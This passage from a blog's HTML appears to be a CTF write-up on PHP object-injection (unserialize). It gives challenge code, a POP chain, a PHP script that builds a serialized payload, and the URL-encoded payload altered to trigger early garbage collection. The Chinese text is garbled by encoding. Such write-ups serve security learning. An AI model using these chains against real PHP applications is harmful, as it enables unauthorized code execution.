</span></span><span class="line"><span class="cl">        <span class="nx">call_user_func</span><span class="p">([</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$func</span><span class="o">.</span><span class="s2">&#34;Me&#34;</span><span class="p">],</span> <span class="nv">$args</span><span class="p">);</span>	 		<span class="c1">// æ¥å—ä¸å­˜åœ¨çš„å±æ€§åå’Œå€¼ï¼Œæ‹¼æ¥ç„¶åé€šè¿‡call_user_func() å‡½æ•°è°ƒç”¨å†…éƒ¨
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">third</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">string</span> <span class="o">=</span> <span class="nv">$string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$var</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$name</span><span class="p">;</span>	<span class="c1">// $nameä¸ºå¤–éƒ¨ä¼ çš„å€¼
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$var</span><span class="p">[</span><span class="nv">$name</span><span class="p">]();</span>			<span class="c1">// æ•°ç»„è°ƒç”¨ç±»
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctfshow&#34;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$a</span><span class="o">=</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;é«˜ä¸€æ–°ç”ŸæŠ¥é“&#34;</span><span class="p">);</span> <span class="c1">// æŠ›å‡ºå¼‚å¸¸ä¼šåœæ­¢æ‰€æœ‰æ“ä½œ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>POPé“¾å­ï¼š</p>
<p><strong>one::__destruct =&gt; second::__call=&gt; second::addMe =&gt; one::__toString =&gt; third::__get =&gt; one::MeMeMe</strong></p>
<p>å› ä¸ºå¼‚å¸¸æŠ›å‡ºçš„åŸå› ï¼Œéœ€è¦é€šè¿‡gcåƒåœ¾å›æ”¶æå‰è§¦å‘ææ„å‡½æ•°(<code>__destruct()</code>)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">one</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">object</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">second</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">object</span><span class="o">-&gt;</span><span class="na">filename</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">one</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">object</span><span class="o">-&gt;</span><span class="na">filename</span><span class="o">-&gt;</span><span class="na">object</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">third</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;string&#34;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="k">new</span> <span class="nx">one</span><span class="p">(),</span> <span class="nx">MeMeMe</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="k">NULL</span><span class="p">);</span>		<span class="c1">// ç½®ç©ºæ•°ç»„
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ³¨æ„æ•°ç»„éœ€è¦è®¾ç½®ä¸º0<strong>è¾¾åˆ°æå‰é”€æ¯å¯¹è±¡çš„ç›®çš„</strong> è§¦å‘gcåƒåœ¾å›æ”¶ï¼Œ%3A<strong>1</strong>%3B  &ndash;&gt; %3A<strong>0</strong>%3B</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">a%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A8%3A%22filename%22%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22thirdstring%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BN%3B%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7Di%3A1%3BN%3B%7D
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æ”¹æˆï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">a%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A8%3A%22filename%22%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22thirdstring%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BN%3B%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7Di%3A0%3BN%3B%7D
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="å‚è€ƒé“¾æ¥">ğŸ”—å‚è€ƒé“¾æ¥</h2>
<p><a class="link" href="https://yangxikun.com/php/2013/08/24/php-garbage-collection-mechanism.html"  target="_blank" rel="noopener"
    >PHPæ–°çš„åƒåœ¾å›æ”¶æœºåˆ¶ (yangxikun.com)</a></p>
<p><a class="link" href="http://blog.m1kael.cn/index.php/archives/14/"  target="_blank" rel="noopener"
    >PHPçš„GCæœºåˆ¶ - M1kaelâ€˜s Blog</a></p>
<p><a class="link" href="https://xz.aliyun.com/t/11843?accounttraceid=411ebc73f66f4f69aea04cef67b0ae0akryd"  target="_blank" rel="noopener"
    >æµ…æPHP GCåƒåœ¾å›æ”¶æœºåˆ¶åŠå¸¸è§åˆ©ç”¨æ–¹å¼ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/php/">php</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2021 - 
        
        2023 main1o&#39;s Blog
    </section>
    
    <section class="powerby">
        
            <img src="https://icp.gov.moe/favicon.ico" alt width="15px" height="15px"><a href="https://icp.gov.moe/?keyword=20229978" target="_blank">èŒICPå¤‡20229978å·</a> <br/>
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
